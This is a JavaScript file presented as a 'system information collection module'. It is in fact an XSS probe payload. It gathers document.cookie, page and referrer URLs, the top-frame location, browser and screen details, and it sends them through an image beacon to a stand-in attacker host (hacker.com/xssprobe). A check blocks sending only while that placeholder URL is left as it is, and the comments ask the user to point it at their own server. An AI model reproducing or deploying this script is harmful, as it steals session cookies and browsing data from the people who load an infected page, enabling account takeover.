/*
 *  System information collection module.
 *  This script gathers various client-side details and transmits them to a remote server.
 *  Authored by an anonymous security researcher.
 */

// Define the target endpoint for data transmission.
// !!! IMPORTANT: This URL must be configured to your specific data collection server.
const remoteDataEndpoint = "http://www.hacker.com/xssprobe/probe.php?c="; // Placeholder URL

// Helper function to safely encode URI components.
// Using encodeURIComponent for better compatibility and robustness than escape().
const safeEncodeURI = (str) => {
    return str ? encodeURIComponent(String(str)) : '';
};

// Helper to determine if a value is a plain object.
const isPlainObject = (value) => {
    if (typeof value !== 'object' || value === null) {
        return false;
    }
    const proto = Object.getPrototypeOf(value);
    return proto === null || proto === Object.prototype;
};

// Main container for aggregated client-side telemetry.
let clientTelemetry = {};

try {
    // Determine browser details: name and approximate version.
    clientTelemetry.browserDetails = (() => {
        const userAgentString = navigator.userAgent ? navigator.userAgent.toLowerCase() : '';
        // Regular expressions for common browser detection patterns.
        const webkitPattern = /(webkit)[ \/]([\w.]+)/;
        const msiePattern = /(msie) ([\w.]+)/;
        const operaPattern = /(opera)(?:.*version)?[ \/]([\w.]+)/;
        const geckoPattern = /(mozilla)(?:.*? rv:([\w.]+))?/; // Mozilla/Gecko-based browsers

        // Attempt to match the user agent string against known patterns.
        const browserIdentifier =
            webkitPattern.exec(userAgentString) ||
            msiePattern.exec(userAgentString) ||
            operaPattern.exec(userAgentString) ||
            (userAgentString.indexOf("compatible") < 0 && geckoPattern.exec(userAgentString)) ||
            []; // Default to an empty array if no match is found.

        // Return a structured object with browser name and version.
        // If no match, default to "unknown" and "0".
        return {
            name: browserIdentifier[1] || "unknown",
            version: browserIdentifier[2] || "0"
        };
    })();

    // Encode and store the full user agent string.
    clientTelemetry.userAgentEncoded = safeEncodeURI(navigator.userAgent);

    // Capture the user's preferred language.
    clientTelemetry.displayLanguage = navigator.language || navigator.userLanguage || 'undefined';

    // Record the referrer URL, if available and safe-encoded.
    clientTelemetry.previousPageURL = safeEncodeURI(document.referrer);

    // Current page URL (top-level window location).
    clientTelemetry.currentPageURL = safeEncodeURI(window.location.href);

    // Top-level frame's location, useful in iframe contexts.
    clientTelemetry.topFrameURL = safeEncodeURI(top.location.href);

    // All cookies associated with the current document.
    clientTelemetry.documentCookies = safeEncodeURI(document.cookie);

    // The domain of the current document.
    clientTelemetry.currentDomain = document.domain;

    // The title of the current document.
    clientTelemetry.documentTitle = document.title;

    // Screen resolution and pixel depth.
    clientTelemetry.displayResolution = (() => {
        let resString = "unavailable";
        if (window.screen) {
            resString = `${screen.width}x${screen.height}`;
            if (screen.colorDepth) {
                resString += ` (${screen.colorDepth}-bit)`;
            }
        }
        return resString;
    })();

    // Attempt to detect Flash Player version.
    clientTelemetry.installedFlashVersion = (() => {
        let flashPluginVer = "";
        const navObj = navigator;

        // Check for Netscape-style plugins (modern browsers).
        if (navObj.plugins && navObj.plugins.length > 0) {
            for (let plugIdx = 0; plugIdx < navObj.plugins.length; plugIdx++) {
                const currentPlugin = navObj.plugins[plugIdx];
                if (currentPlugin.name.includes('Shockwave Flash')) {
                    // Extract version from description string.
                    const versionMatch = currentPlugin.description.match(/Shockwave Flash ([\d.]+)/);
                    if (versionMatch && versionMatch[1]) {
                        flashPluginVer = versionMatch[1];
                    }
                    break;
                }
            }
        } else if (window.ActiveXObject) { // Check for ActiveX objects (IE).
            for (let axVer = 15; axVer >= 2; axVer--) { // Iterate through common ActiveX versions.
                try {
                    // Attempt to create an ActiveX object for Flash.
                    // Using `new ActiveXObject()` is safer than `eval()`.
                    const flashActiveX = new ActiveXObject(`ShockwaveFlash.ShockwaveFlash.${axVer}`);
                    if (flashActiveX) {
                        flashPluginVer = `${axVer}.0`;
                        break;
                    }
                } catch (e) {
                    // Continue to the next version if object creation fails.
                }
            }
        }
        return flashPluginVer || "not detected"; // Default if Flash is not found.
    })();

    // Add a timestamp for when the data was collected.
    clientTelemetry.collectionTimestamp = Date.now();

    // Generate a simple unique identifier for this collection instance.
    clientTelemetry.sessionIdentifier = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);

} catch (dataCollectionError) {
    // In a real scenario, you might log this error or send it to a different endpoint.
    // For now, we'll just ensure clientTelemetry is an empty object if an error occurs.
    console.error("Error during client telemetry collection:", dataCollectionError);
    clientTelemetry = { error: safeEncodeURI(dataCollectionError.message || "Unknown error during data collection.") };
}


/**
 * Converts a JavaScript object into a string literal representation,
 * suitable for URL parameters. Handles nested objects recursively.
 * Keys and string values are single-quoted.
 * @param {Object} dataObject The object to serialize.
 * @returns {string} The string literal representation.
 */
function serializeToLiteralString(dataObject) {
    if (!isPlainObject(dataObject)) {
        // If not a plain object, return its string representation directly.
        return JSON.stringify(dataObject);
    }

    const objectEntries = [];
    for (const propKey in dataObject) {
        // Ensure property belongs to the object itself, not its prototype chain.
        if (Object.prototype.hasOwnProperty.call(dataObject, propKey)) {
            const propValue = dataObject[propKey];
            let formattedValue;

            if (isPlainObject(propValue)) {
                // Recursively serialize nested objects.
                formattedValue = serializeToLiteralString(propValue);
            } else if (typeof propValue === 'string') {
                // Wrap strings in single quotes, escaping internal single quotes.
                formattedValue = `'${propValue.replace(/'/g, "\\'")}'`;
            } else if (typeof propValue === 'number' || typeof propValue === 'boolean') {
                // Numbers and booleans are represented directly.
                formattedValue = String(propValue);
            } else if (propValue === null) {
                formattedValue = 'null';
            } else if (typeof propValue === 'undefined') {
                // For undefined, represent as 'null' for consistency.
                formattedValue = 'null';
            } else {
                // Fallback for other types (functions, symbols, etc.) - stringify them.
                formattedValue = `'${String(propValue).replace(/'/g, "\\'")}'`;
            }
            objectEntries.push(`'${propKey}':${formattedValue}`);
        }
    }
    return `{${objectEntries.join(',')}}`;
}

// Execute the data transmission when the entire page has loaded.
window.addEventListener('load', () => {
    // Prevent execution if the endpoint is not properly configured.
    if (!remoteDataEndpoint || remoteDataEndpoint === "http://www.hacker.com/xssprobe/probe.php?c=") {
        console.warn("Telemetry endpoint not configured. Data will not be transmitted.");
        return;
    }

    const serializedPayload = serializeToLiteralString(clientTelemetry);

    // Create a new Image object to send the data via a GET request.
    const pixelBeacon = new Image();

    // Set an error handler for the image, in case the request fails.
    pixelBeacon.onerror = () => {
        console.error("Failed to transmit telemetry data to endpoint:", remoteDataEndpoint);
    };

    // Construct the final URL and initiate the request.
    // Using a small delay to ensure other page-load events complete first.
    setTimeout(() => {
        pixelBeacon.src = remoteDataEndpoint + serializedPayload;
        // The image doesn't need to be appended to the DOM; its loading alone sends the request.
    }, 50); // Delay by 50 milliseconds.
});